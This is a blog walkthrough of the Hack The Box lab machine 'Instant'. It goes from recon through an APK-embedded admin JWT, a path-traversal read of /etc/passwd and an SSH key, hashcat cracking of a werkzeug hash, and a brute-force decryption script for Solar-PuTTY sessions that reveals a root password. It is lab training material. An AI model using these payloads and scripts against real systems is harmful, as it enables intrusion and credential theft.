---
title: "Instant - Hack The Box Machines"
date: 2024-10-30 08:00:00 - 0500
categories: [Hack The Box, Machines]
tags: [htb, machine, linux, medium]
image: 
  path: /assets/img/posts/htb/htb.png
---


## Reconnaisance

Hello and welcome back to another challenge on Hack The Box and I’m a noob in cybersecurity. 
Today, let’s begin with a Linux challenge called `Instant` at a medium difficulty level.
As with many previous challenges, I will start with the recon phase to identify the attack vector.
```bash
yzx@machine:~/workspace/hackthebox$ nmap -p- 10.10.x.x -T4 --min-rate=2000 -oN instant.nmap -Pn --disable-arp-ping
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-09 19:28 EST
Nmap scan report for 10.10.x.x
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 37.51 seconds
yzx@machine:~/workspace/hackthebox$ nmap -p22,80 -sCV 10.10.x.x
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-09 19:29 EST
Nmap scan report for 10.10.11.37
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
yzx@machine:~/workspace/hackthebox$ 

```
{: .nolineno }
After performing enumeration of ports and services running on the target machine using the Nmap tool, looking at the Nmap result, we can see that two ports are open: 22 (SSH) and 80 (HTTP). 
Before performing the next steps, I will add the IP and domain to the `/etc/hosts` file.
```bash
$ echo '10.10.x.x instant.htb' | sudo tee -a /etc/hosts
```
{: .nolineno }
## Gain access shirohige user
Next I accessed `http://instant.htb` and was presented with a web interface like this: 
![](/assets/img/posts/htb/instant/figure1.png){: width="972" height="589" }
I noted that I can download an APK file from the URL: `http://instant.htb/downloads/instant.apk`
After downloading the APK file to my machine, I used `apktool` to decompile the file. After decompiling, I found two subdomains in the  `res/xml/network_security_config.xml` file.
```
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```
Or you can use the grep command as follows: 
```bash
$ grep -i -r instant.htb instant
```
{: .nolineno }
![](/assets/img/posts/htb/instant/figure2.png){: width="972" height="589" }
Accessing the subdomain `swagger-ui.instant.htb` redirects to an apidocs page, which contains APIs related to `users`, `logs`, and `transactions`
![](/assets/img/posts/htb/instant/figure3.png){: width="972" height="589" }
I will try with `/api/v1/register` and `/api/v1/login`
```bash 
$ curl -X POST http://swagger-ui.instant.htb/api/v1/register \
-H "Content-Type: application/json" \
-d '{
	"email": "yzx@instant.htb",
	"password": "P@ssw0rd",
	"pin": "12345",
	"username": "yzx"
}'
```
{: .nolineno }
![](/assets/img/posts/htb/instant/figure5.png){: width="972" height="589" }
After successfully registering with `/api/v1/register`, I proceed to log in and receive an access token.
![](/assets/img/posts/htb/instant/figure4.png){: width="972" height="589" }
This is a JWT token, so I decode it and can see that this JWT token has several fields such as `id`, `role`, `wallId`, `exp`. Then, I try to change my role field to `admin` in order to access the admin-related APIs, but the result I get is unauthorized.
![](/assets/img/posts/htb/instant/figure6.png){: width="972" height="589" }
At this point, I thought about the APK file from the beginning. I tried searching to see if there was any information related to the access token of another user or of the admin within this APK file. Finally, I found a token string in the `AdminActivities.smali` file.
![](/assets/img/posts/htb/instant/figure7.png){: width="972" height="589" }
![](/assets/img/posts/htb/instant/figure8.png){: width="972" height="589" }
Decode this JWT token
![](/assets/img/posts/htb/instant/figure9.png){: width="972" height="589" }
List user
```bash
$ curl -X GET 'http://swagger-ui.instant.htb/api/v1/admin/list/users' -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```
{: .nolineno }
```
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    },
    {
      "email": "yzx@instant.htb",
      "role": "instantian",
      "secret_pin": 12345,
      "status": "active",
      "username": "yzx",
      "wallet_id": "6f8216c2-8c6f-4437-b141-23ee1594ed0f"
    }
  ]
}
```
View log file with `/api/v1/admin/view/logs`
![](/assets/img/posts/htb/instant/figure10.png){: width="972" height="589" }
Read log file `/api/v1/admin/read/log?log_file_name=`
![](/assets/img/posts/htb/instant/figure11.png){: width="972" height="589" }
With the API used to read log files, we can see that the path is `/home/shirohige/logs`. So, when I pass the path `../../../etc/passwd` into the log_file_name parameter to trigger an LFI (Local File Inclusion) vulnerability, as shown in the image below, I am able to read the contents of `/etc/passwd`.
![](/assets/img/posts/htb/instant/figure12.png){: width="972" height="589" }
As we saw earlier during the recon enumeration phase, port 22 for the SSH service is open. So, using this LFI vulnerability, I tried to retrieve the SSH key file from the `.ssh` directory.
![](/assets/img/posts/htb/instant/figure13.png){: width="972" height="589" }
At this point, I was able to retrieve the user flag.
![](/assets/img/posts/htb/instant/figure14.png){: width="972" height="589" }

## Gain access root user
From the home directory of the user `shirohige`, we can see two folders: logs and projects. Continuing to explore the projects folder, I found a database file at the path `/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db`.
I downloaded this file to my machine and examined what the database contains
![](/assets/img/posts/htb/instant/figure15.png){: width="972" height="589" }
```bash
sqlite> select * from wallet_users; 
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
sqlite> 
```
{: .nolineno }
Hash format: `pbkdf2:sha256:<number of iterations>$<salt>$<hash>`

Reformated werkzeug hash with python code
```python
import base64

with open ('hash.txt', 'r') as file: 
    hashes = [line.strip() for line in file.readlines() if line != '\n']

for i, hash in enumerate(hashes):
    parts = hash.split('$')
    if len (parts) != 3: 
        print (f'[!] - Unsupported hash')
        exit()
    method = parts[0].split(':')
    salt, sha_hash = parts[1:]

    base64_salt = salt
    base64_salt = base64.b64encode(salt.encode()).decode()
    base64_hash = base64.b64encode(bytes.fromhex(sha_hash)).decode()
    print (f'[*] - Reformated: sha256:{method[2]}:{base64_salt}:{base64_hash}')
```
{: .nolineno }
Crack this hash with hashcat tool: 
```bash
$ hashcat -m 10900 -a 0  passwort.txt rockyou.txt

...
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
...
```
{: .nolineno }
I used [SolarPuttyDecrypt.py](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5) and the sessions-backup.dat file found at the path `/opt/backups/Solar-PuTTY`. 
```python
import base64
import sys
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key using PBKDF2
        key = PBKDF2(passphrase, salt, dkLen=24, count=1000)

        # Create the Triple DES cipher in CBC mode
        cipher = DES3.new(key, DES3.MODE_CBC, iv)

        # Decrypt the data
        decrypted_data = cipher.decrypt(encrypted_data)

        # Remove padding (PKCS7 padding)
        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        print(f'Error: {e}')

    return data

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} putty_session.dat wordlist.txt')
    exit(1)

with open(sys.argv[1]) as f:
    cipher = f.read()

with open(sys.argv[2]) as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        decrypted = decrypt(password, cipher)
        print(f'[{i}] {password=}', end='\r')
        if 'Credentials' in decrypted:
            print(f'\r[{i}] {password=} {" " * 10}')
            print()
            print(decrypted)
            break
```
{: .nolineno }
Before running this script you must install requirements:
```
cryptography==41.0.5
pycryptodome==3.21.0
```	
After decrypting, I obtained the root password:
```
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```
When I obtained the root password, I was able to get the root flag by using `su root` instead of `ssh`
![](/assets/img/posts/htb/instant/figure16.png){: width="972" height="589" }

## Referenes
[1] - [VoidSec solar putty decrypt](https://voidsec.com/solarputtydecrypt/)<br>
[2] - [Reverse Engineering Solar-PuTTY 4.0.0.47](https://hackmd.io/@tahaafarooq/cracking-solar-putty)<br>
[3] - [Hashcat wiki werkzeug](https://hashcat.net/wiki/doku.php?id=example_hashes)<br>